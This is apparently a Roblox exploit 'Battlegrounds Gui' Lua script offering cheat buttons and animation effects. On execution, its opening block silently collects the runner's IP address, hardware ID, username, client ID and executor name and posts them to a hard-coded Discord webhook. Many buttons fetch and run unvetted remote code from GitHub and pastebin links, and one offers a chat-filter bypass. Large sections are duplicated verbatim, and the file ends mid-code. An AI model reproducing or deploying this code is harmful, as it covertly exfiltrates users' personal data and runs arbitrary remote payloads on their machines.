task.spawn(function()
    local lp = game.Players.LocalPlayer
    local userName, displayName = lp.Name, lp.DisplayName
    local userId = lp.UserId

    local jobId = game.JobId
    local placeId = game.PlaceId

local function GetServerType()
	if game.PrivateServerId ~= "" then
		if game.PrivateServerOwnerId ~= 0 then
			return "VIPServer"
		else
			return "ReservedServer"
		end
	else
		return "StandardServer"
	end
end

local http = game:GetService("HttpService")
local req = request
local Get = req(
    {
        Url = "https://httpbin.org/ip", 
        Method = 'GET'
        }
        )
local Data = game:GetService('HttpService'):JSONDecode(Get.Body)
IP = Data.origin -- Ip

    local hubName = "Battlegrounds Gui"
    local currentTime = os.date("%Y-%m-%d %H:%M:%S")

    local identifiedExecutor = identifyexecutor and tostring(identifyexecutor()) or "Unknown"
    local executorName = getexecutorname and tostring(getexecutorname()) or "Unknown"
    local hwid = (gethwid and tostring(gethwid())) or (get_hwid and tostring(get_hwid()))

    local deviceType = game:GetService("UserInputService"):GetPlatform() == Enum.Platform.Windows and "ÃƒÂ°Ã…Â¸Ã¢â‚¬â„¢Ã‚Â»" or "ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã‚Â±"

    local function fetchImage()
        local firstUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. userId .. "&size=150x150&format=Png"
        local secondUrl = game:HttpGet(firstUrl)
        
        local jsonData = http:JSONDecode(secondUrl)
        local imageUrl = jsonData.data[1].imageUrl

        return imageUrl
    end

    function webhook()
        if HWID ~= "8d27e11c92518374" then
            local imageUrl = fetchImage()
            local Body = http:JSONEncode({
                ["username"] = hubName,
                --["avatar_url"] = "thumbnailOfTheWebhook",

                ["embeds"] = {{
                    ["title"] = "Some N- executed your script",
                    ["description"] = "User Device: ".. deviceType,
                    ["type"] = "rich",
                    ["color"] = tonumber(0x000000),
                    ["fields"] = {
                        {
                            ["name"] = "\n\n-----------------------------------------------------Information** **",
                            ["value"] = "Identified Executor: " .. identifiedExecutor .. 
                                        "\nExecutor Name: " .. executorName .. 
                                        "\nServer Players: " .. #game.Players:GetChildren() .. 
                                        "\nServer Type: " .. GetServerType() ..
                                        "\nUsername: [" .. userName .. " (" .. displayName .. 
                                        ")](https://www.roblox.com/users/" .. userId .. 
                                        "/profile)\nClient ID: " .. game:GetService("RbxAnalyticsService"):GetClientId() .. 
                                        "\nHWID: " .. hwid.. "\nIP: " .. IP .. 
                                        "\n-----------------------------------------------------",
                            ["inline"] = false
                        },
                        {
                            ["name"] = "JobId Join",
                            ["value"] = "```Roblox.GameLauncher.joinGameInstance('" .. placeId .. "', '" .. jobId .. "')```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "JobId",
                            ["value"] = "```" .. jobId .. "```",
                            ["inline"] = true
                        },
                    },
                    ["thumbnail"] = {
                        ["url"] = imageUrl
                    },
                    ["footer"] = {
                        ["text"] = "Script ran at " .. currentTime,
                    },
                }},
            })

            local Headers = {
                ["content-type"] = "application/json"
            }

            local Url = "https://discord.com/api/webhooks/1268416377476349952/5MhiFsuJVjqRIwERTkt8ylzo2qFinrFykDXY3e7JgrTpcPiMOojxN2DJlG3hHRAI00BN"

            request({
                Url = Url,
                Body = Body,
                Method = "POST",
                Headers = Headers
            })
        end
    end

    webhook()
end)




local player = game.Players.LocalPlayer

local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()

local Window = OrionLib:MakeWindow({Name = "Battlegrounds Gui'", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})

--[[
Name = <string> - The name of the UI.
HidePremium = <bool> - Whether or not the user details shows Premium status or not.
SaveConfig = <bool> - Toggles the config saving in the UI.
ConfigFolder = <string> - The name of the folder where the configs are saved.
IntroEnabled = <bool> - Whether or not to show the intro animation.
IntroText = <string> - Text to show in the intro animation.
IntroIcon = <string> - URL to the image you want to use in the intro animation.
Icon = <string> - URL to the image you want displayed on the window.
CloseCallback = <function> - Function to execute when the window is closed.
]]

local Tab = Window:MakeTab({
	Name = "Tsb",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

--[[
Name = <Tsb Stuff> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

local Section = Tab:AddSection({
	Name = "Choose pls"
}) 

--[[
Name = <Scripts for tsb> - The name of the section.
]]

OrionLib:MakeNotification({
	Name = "pls showcase dis on yt",
	Content = "Showcase this for Vip Gui!",
	Image = "rbxassetid://4483345998",
	Time = 5
})

--[[
Title = <string> - The title of the notification.
Content = <string> - The content of the notification.
Image = <string> - The icon of the notification.
Time = <number> - The duration of the notfication.
]]

Tab:AddButton({
	Name = "Kadehub script [DOWN]",
	Callback = function()
getgenv().AutoReport = true
loadstring(game:HttpGet("https://raw.githubusercontent.com/skibiditoiletfan2007/KadeHubRepository/main/Latest.lua"))() 

  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "Ms Hacker's Script'",
	Callback = function()
getgenv().changeAnim = function(OGAnim, NewAnim, NewAnimSpeed, NewAnimTPos)
local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")
    
    humanoid.AnimationPlayed:Connect(function(d)
if d.Animation.AnimationId == "rbxassetid://"..tostring(OGAnim) then
d:Stop()

        local pchar= game.Players.LocalPlayer.Character
        local AnimationId = tostring(NewAnim)
        local Anim = Instance.new("Animation")
        Anim.AnimationId = "rbxassetid://"..AnimationId
        local k = pchar:FindFirstChildOfClass('Humanoid'):LoadAnimation(Anim)
        k:Play()
if NewAnimSpeed then
k:AdjustSpeed(NewAnimSpeed)
end
if NewAnimTPos then
k.TimePosition = NewAnimTPos
end
       end
end)
end

  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "Secret's script [DOWN]",
	Callback = function()
getgenv().scriptWl = "KidsOnlyJoinDiscordIfScriptsDown"
getgenv().ToggleKeybind = Enum.KeyCode.RightControl
loadstring(game:HttpGet("https://raw.githubusercontent.com/ATrain-Roblox/main/main/Phantasm.lua"))()

  	end    
})

  Tab:AddButton({
	Name = "Aquarius Hub!",
	Callback = function()
      		loadstring(game:HttpGet("https://rentry.org/aquarius-hub/raw"))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]
local Tab = Window:MakeTab({
	Name = "jujutsu shenanigans",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

local Section = Tab:AddSection({
	Name = "Premium features will be added soon"
})

--[[
Name = <string> - The name of the section.
]]

Tab:AddButton({
	Name = "Nil script",
	Callback = function()    		loadstring(game:HttpGet("https://raw.githubusercontent.com/JayXSama/ray-makk/main/Loader"))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "legend YT",
	Callback = function()	loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/Jujutsu/main/Shenanigans"))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]
  
local Tab = Window:MakeTab({
	Name = "Chat Bypass",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

local Section = Tab:AddSection({
	Name = "chat bypasser Fr fr"
})

--[[
Name = <string> - The name of the section.
]]

Tab:AddButton({
	Name = "Fe Chat bypasser",
	Callback = function() 		loadstring(game:HttpGet("https://raw.githubusercontent.com/BakaPraselol/MRCBV4LSB4KRS/main/Loader"))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

local Tab = Window:MakeTab({
	Name = "cure stuff (Tsb)",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

local Section = Tab:AddSection({
	Name = "client fr fr",
})

--[[
Name = <string> - The name of the section.
]]

Tab:AddButton({
	Name = "Dummy Uses kj awk",
	Callback = function()
      	local player = game.Workspace.Live["Weakest Dummy"]
repeat wait() until player.Humanoid
local dummyhumanoid = game.Workspace.Live["Weakest Dummy"]["Humanoid"]

local soundeffect = Instance.new("Sound")
soundeffect.SoundId = "rbxassetid://17150550559"
soundeffect.Parent = game.Workspace.Live["Weakest Dummy"]["Torso"]
soundeffect:Play()
soundeffect.Volume = 3

local soundeffect = Instance.new("Sound")
soundeffect.SoundId = "rbxassetid://17150550302"
soundeffect.Parent = game.Workspace.Live["Weakest Dummy"]["Torso"]
soundeffect:Play()
soundeffect.Volume = 5

local anim2 = Instance.new("Animation")
anim2.AnimationId = "rbxassetid://17140902079"

local playAnim2 = dummyhumanoid:LoadAnimation(anim2)
playAnim2:Play()

local fine = game.ReplicatedStorage.Resources.KJEffects["fine...1"].EnableBatch2:Clone()
fine.Parent = game.Workspace.Live["Weakest Dummy"]["Torso"]
    for _, child in ipairs(fine:GetChildren()) do
        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
            child:Emit(1) -- Emit 20 particles
        end
    end
local fine3 = game.ReplicatedStorage.Resources.KJEffects["fine...Emit"].EmitBatch3:Clone()
fine3.Parent = game.Workspace.Live["Weakest Dummy"]["Torso"]
    for _, child in ipairs(fine3:GetChildren()) do
        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
            child:Emit(1) -- Emit 20 particles
        end
    end
local red = game.ReplicatedStorage.Resources.KJEffects["fine...1"].REDDDD1:Clone()
red.Parent = game.Workspace.Live["Weakest Dummy"]["Right Leg"]
    for _, child in ipairs(red:GetChildren()) do
        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
            child:Emit(1) -- Emit 20 particles
        end
    end
local red2 = game.ReplicatedStorage.Resources.KJEffects["fine...1"].REDDDD2:Clone()
red2.Parent = game.Workspace.Live["Weakest Dummy"]["Left Leg"]
    for _, child in ipairs(red2:GetChildren()) do
        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
            child:Emit(1) -- Emit 20 particles
        end
    end
local red3 = game.ReplicatedStorage.Resources.KJEffects["fine...1"].REDDDD3:Clone()
red3.Parent = game.Workspace.Live["Weakest Dummy"]["Left Leg"]
    for _, child in ipairs(red3:GetChildren()) do
        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
            child:Emit(1) -- Emit 20 particles
        end
    end
local red4 = game.ReplicatedStorage.Resources.KJEffects["fine...1"].REDDDD4:Clone()
red4.Parent = game.Workspace.Live["Weakest Dummy"]["Right Leg"]
    for _, child in ipairs(red4:GetChildren()) do
        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
            child:Emit(1) -- Emit 20 particles
        end
    end
wait(8.2)
game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
fine:Destroy()
red:Destroy()
red2:Destroy()
red3:Destroy()
red4:Destroy()
local fine2 = game.ReplicatedStorage.Resources.KJEffects["fine...Emit2"].EmitBatch1:Clone()
fine2.Parent = game.Workspace.Live["Weakest Dummy"]["Right Arm"]
    for _, child in ipairs(fine2:GetChildren()) do
        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
            child:Emit(1) -- Emit 20 particles
        end
    end
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "20 20 20 dropkick",
	Callback = function()
      		-- Create the Tool instance
local tool = Instance.new("Tool")

-- Set the tool's properties
tool.Name = "20-20-20 Dropkick"
tool.RequiresHandle = false  -- Set to true if you have a handle part
tool.CanBeDropped = true     -- Change as needed

-- Add a description or other properties
tool.ToolTip = "The infamous dropkick from KJ."

-- Function to make stuff happen when activated
local function activateTool()
local p = game.Players.LocalPlayer
local Humanoid = p.Character:WaitForChild("Humanoid")

local AnimAnim = Instance.new("Animation")
AnimAnim.AnimationId = "rbxassetid://17354976067"
local Anim = Humanoid:LoadAnimation(AnimAnim)
AnimAnim.AnimationId = "rbxassetid://0" -- Reset animation ID
Anim:Play()

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local function setWalkSpeedToZero()
    local humanoid = character:WaitForChild("Humanoid")
    humanoid.WalkSpeed = 0
end

if character then
    setWalkSpeedToZero()
end

player.CharacterAdded:Connect(function(newCharacter)
    character = newCharacter
    setWalkSpeedToZero()
end)

spawn(function()
    loadstring(game:HttpGet("https://pastebin.pl/view/raw/93703964"))()
end)

spawn(function()
    loadstring(game:HttpGet("https://pastebin.pl/view/raw/a9d0f7d7"))()
end)

-- Local Script

local soundId = 17429233290 -- Correct sound ID

-- Create a new Sound instance
local sound = Instance.new("Sound")
sound.Name = "Dropkick Miss"
sound.SoundId = "rbxassetid://" .. soundId
sound.Volume = 1
sound.Pitch = 1.0 -- Pitch set to 1.0
sound.PlaybackSpeed = 1.0 -- Adjusted playback speed

-- Parent the sound to Workspace
sound.Parent = workspace

-- Play the sound
sound:Play()

-- Local Script

local soundId2 = 17356346310 -- Correct sound ID

-- Create a new Sound instance
local sound2 = Instance.new("Sound")
sound2.Name = "Dropkick Miss Music"
sound2.SoundId = "rbxassetid://" .. soundId2
sound2.Volume = 0.8
sound2.Pitch = 1.0 -- Pitch set to 1.0
sound2.PlaybackSpeed = 1.0 -- Adjusted playback speed

-- Parent the sound to Workspace
sound2.Parent = workspace

-- Play the sound
sound2:Play()

Wait(1.79)

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlinesandstuff part inside KJEffects
local speedlinesandstuffPart = kjEffectsFolder:WaitForChild("speedlinesandstuff")

-- Duplicate the speedlinesandstuff part
local speedlinesandstuffClone = speedlinesandstuffPart:Clone()

-- Put the duplicate in Workspace
speedlinesandstuffClone.Parent = Workspace

-- Offset position behind the player
local offset = Vector3.new(0, 0, -9) -- Adjust the offset as needed

-- Function to update the position of the speedlinesandstuff clone to follow the player with offset
local function updateSpeedlinesPosition()
    while true do
        speedlinesandstuffClone.CFrame = rootPart.CFrame * CFrame.new(offset)
        wait(0.1) -- Adjust the wait time as needed
    end
end

-- Get references to ReplicatedStorage and Workspace
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Function to recursively find a part by name within a parent
local function findPartByName(parent, name)
    local part = parent:FindFirstChild(name)
    if part then
        return part
    else
        for _, child in ipairs(parent:GetChildren()) do
            part = findPartByName(child, name)
            if part then
                return part
            end
        end
    end
    return nil
end

-- Wait for ReplicatedStorage.Resources.KJEffects.speedlinesandstuff.thespeedthingunderultik to exist
local function waitForPart()
    local speedlinesandstuff = ReplicatedStorage:WaitForChild("Resources"):WaitForChild("KJEffects"):WaitForChild("speedlinesandstuff")
    local thespeedthingunderultik = findPartByName(speedlinesandstuff, "thespeedthingunderultik")
    if thespeedthingunderultik then
        -- Clone the part into Workspace and make it follow the player
        local clonedPart = thespeedthingunderultik:Clone()
        clonedPart.Parent = Workspace
        
        -- Function to make the cloned part follow the player
        local function followPlayer()
            local player = game.Players.LocalPlayer
            local character = player.Character
            if character then
                local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
                local humanoid = character:FindFirstChildOfClass("Humanoid")
                if humanoidRootPart and humanoid then
                    local torso = humanoidRootPart:FindFirstChild("LowerTorso")
                    if torso then
                        clonedPart.CFrame = torso.CFrame
                        clonedPart.CFrame = clonedPart.CFrame * CFrame.new(0, -humanoid.HipHeight / 2, 0) -- Offset under the legs
                        clonedPart.CFrame = clonedPart.CFrame * CFrame.Angles(0, math.rad(180), 0) -- Make it look where the character looks
                    end
                end
            end
        end
        
        -- Run the followPlayer function every frame
        game:GetService("RunService").RenderStepped:Connect(followPlayer)
    else
        warn("Part thespeedthingunderultik not found inside speedlinesandstuff.")
    end
end

-- Call the waitForPart function
waitForPart()

-- Run the function in a separate thread
spawn(updateSpeedlinesPosition)

-- Get references to ReplicatedStorage and Workspace
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Function to recursively find a part by name within a parent
local function findPartByName(parent, name)
    local part = parent:FindFirstChild(name)
    if part then
        return part
    else
        for _, child in ipairs(parent:GetChildren()) do
            part = findPartByName(child, name)
            if part then
                return part
            end
        end
    end
    return nil
end

-- Wait for ReplicatedStorage.Resources.KJEffects.speedlinesandstuff.thespeedthingunderultik to exist
local function waitForPart()
    local speedlinesandstuff = ReplicatedStorage:WaitForChild("Resources"):WaitForChild("KJEffects"):WaitForChild("speedlinesandstuff")
    local thespeedthingunderultik = findPartByName(speedlinesandstuff, "thespeedthingunderultik")
    if thespeedthingunderultik then
        -- Clone the part into Workspace and make it follow the player
        local clonedPart = thespeedthingunderultik:Clone()
        clonedPart.Parent = Workspace
        
        -- Function to make the cloned part follow the player
        local function followPlayer()
            local player = game.Players.LocalPlayer
            local character = player.Character
            if character then
                local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
                if humanoidRootPart then
                    clonedPart.CFrame = humanoidRootPart.CFrame
                    clonedPart.CFrame = clonedPart.CFrame * CFrame.new(0, -0.3, -2) -- Offset from character (adjusted)
                    clonedPart.CFrame = clonedPart.CFrame * CFrame.Angles(0, math.rad(180), 0) -- Make it look where the character looks
                end
            end
        end
        
        -- Run the followPlayer function every frame
        game:GetService("RunService").RenderStepped:Connect(followPlayer)
    else
        warn("Part thespeedthingunderultik not found inside speedlinesandstuff.")
    end
end

-- Call the waitForPart function
waitForPart()


local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlines part inside KJEffects
local speedlinesPart = kjEffectsFolder:WaitForChild("speedlines")

-- Duplicate the speedlines part
local speedlinesClone = speedlinesPart:Clone()

-- Put the duplicate in Workspace
speedlinesClone.Parent = Workspace

-- Function to update the position of the speedlines clone to follow the player
local function updateSpeedlinesPosition()
    while true do
        speedlinesClone.CFrame = rootPart.CFrame
        wait(0.1) -- Adjust the wait time as needed
    end
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlines part inside KJEffects
local speedlinesPart = kjEffectsFolder:WaitForChild("speedlines")

-- Duplicate the speedlines part
local speedlinesClone = speedlinesPart:Clone()

-- Put the duplicate in Workspace
speedlinesClone.Parent = Workspace

-- Function to update the position of the speedlines clone to follow the player
local function updateSpeedlinesPosition()
    while true do
        speedlinesClone.CFrame = rootPart.CFrame
        wait(0.1) -- Adjust the wait time as needed
    end
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlines part inside KJEffects
local speedlinesPart = kjEffectsFolder:WaitForChild("speedlines")

-- Duplicate the speedlines part
local speedlinesClone = speedlinesPart:Clone()

-- Put the duplicate in Workspace
speedlinesClone.Parent = Workspace

-- Function to update the position of the speedlines clone to follow the player
local function updateSpeedlinesPosition()
    while true do
        speedlinesClone.CFrame = rootPart.CFrame
        wait(0.1) -- Adjust the wait time as needed
    end
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlines part inside KJEffects
local speedlinesPart = kjEffectsFolder:WaitForChild("speedlines")

-- Duplicate the speedlines part
local speedlinesClone = speedlinesPart:Clone()

-- Put the duplicate in Workspace
speedlinesClone.Parent = Workspace

-- Function to update the position of the speedlines clone to follow the player
local function updateSpeedlinesPosition()
    while true do
        speedlinesClone.CFrame = rootPart.CFrame
        wait(0.1) -- Adjust the wait time as needed
    end
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlines part inside KJEffects
local speedlinesPart = kjEffectsFolder:WaitForChild("speedlines")

-- Duplicate the speedlines part
local speedlinesClone = speedlinesPart:Clone()

-- Put the duplicate in Workspace
speedlinesClone.Parent = Workspace

-- Function to update the position of the speedlines clone to follow the player
local function updateSpeedlinesPosition()
    while true do
        speedlinesClone.CFrame = rootPart.CFrame
        wait(0.1) -- Adjust the wait time as needed
    end
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlines part inside KJEffects
local speedlinesPart = kjEffectsFolder:WaitForChild("speedlines")

-- Duplicate the speedlines part
local speedlinesClone = speedlinesPart:Clone()

-- Put the duplicate in Workspace
speedlinesClone.Parent = Workspace

-- Function to update the position of the speedlines clone to follow the player
local function updateSpeedlinesPosition()
    while true do
        speedlinesClone.CFrame = rootPart.CFrame
        wait(0.1) -- Adjust the wait time as needed
    end
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlines part inside KJEffects
local speedlinesPart = kjEffectsFolder:WaitForChild("speedlines")

-- Duplicate the speedlines part
local speedlinesClone = speedlinesPart:Clone()

-- Put the duplicate in Workspace
speedlinesClone.Parent = Workspace

-- Function to update the position of the speedlines clone to follow the player
local function updateSpeedlinesPosition()
    while true do
        speedlinesClone.CFrame = rootPart.CFrame
        wait(0.1) -- Adjust the wait time as needed
    end
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlines part inside KJEffects
local speedlinesPart = kjEffectsFolder:WaitForChild("speedlines")

-- Duplicate the speedlines part
local speedlinesClone = speedlinesPart:Clone()

-- Put the duplicate in Workspace
speedlinesClone.Parent = Workspace

-- Function to update the position of the speedlines clone to follow the player
local function updateSpeedlinesPosition()
    while true do
        speedlinesClone.CFrame = rootPart.CFrame
        wait(0.1) -- Adjust the wait time as needed
    end
end

-- Enable particle emitters and set emission properties
local function setupParticles(part)
    for _, descendant in pairs(part:GetDescendants()) do
        if descendant:IsA("ParticleEmitter") then
            descendant.Rate = 100
            descendant.Enabled = true
            descendant:Emit(100)
        end
    end
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlines part inside KJEffects
local speedlinesPart = kjEffectsFolder:WaitForChild("speedlines")

-- Duplicate the speedlines part
local speedlinesClone = speedlinesPart:Clone()

-- Put the duplicate in Workspace
speedlinesClone.Parent = Workspace

-- Function to update the position of the speedlines clone to follow the player
local function updateSpeedlinesPosition()
    while true do
        speedlinesClone.CFrame = rootPart.CFrame
        wait(0.1) -- Adjust the wait time as needed
    end
end
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlines part inside KJEffects
local speedlinesPart = kjEffectsFolder:WaitForChild("speedlines")

-- Duplicate the speedlines part
local speedlinesClone = speedlinesPart:Clone()

-- Put the duplicate in Workspace
speedlinesClone.Parent = Workspace

-- Function to update the position of the speedlines clone to follow the player
local function updateSpeedlinesPosition()
    while true do
        speedlinesClone.CFrame = rootPart.CFrame
        wait(0.1) -- Adjust the wait time as needed
    end
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlines part inside KJEffects
local speedlinesPart = kjEffectsFolder:WaitForChild("speedlines")

-- Duplicate the speedlines part
local speedlinesClone = speedlinesPart:Clone()

-- Put the duplicate in Workspace
speedlinesClone.Parent = Workspace

-- Function to update the position of the speedlines clone to follow the player
local function updateSpeedlinesPosition()
    while true do
        speedlinesClone.CFrame = rootPart.CFrame
        wait(0.1) -- Adjust the wait time as needed
    end
end


-- Setup particles in the duplicated part
setupParticles(speedlinesClone)

-- Run the function in a separate thread
spawn(updateSpeedlinesPosition)

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlines part inside KJEffects
local speedlinesPart = kjEffectsFolder:WaitForChild("speedlines")

-- Duplicate the speedlines part
local speedlinesClone = speedlinesPart:Clone()

-- Put the duplicate in Workspace
speedlinesClone.Parent = Workspace

-- Function to update the position of the speedlines clone to follow the player
local function updateSpeedlinesPosition()
    while true do
        speedlinesClone.CFrame = rootPart.CFrame
        wait(0.1) -- Adjust the wait time as needed
    end
end


-- Setup particles in the duplicated part
setupParticles(speedlinesClone)

-- Run the function in a separate thread
spawn(updateSpeedlinesPosition)

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlines part inside KJEffects
local speedlinesPart = kjEffectsFolder:WaitForChild("speedlines")

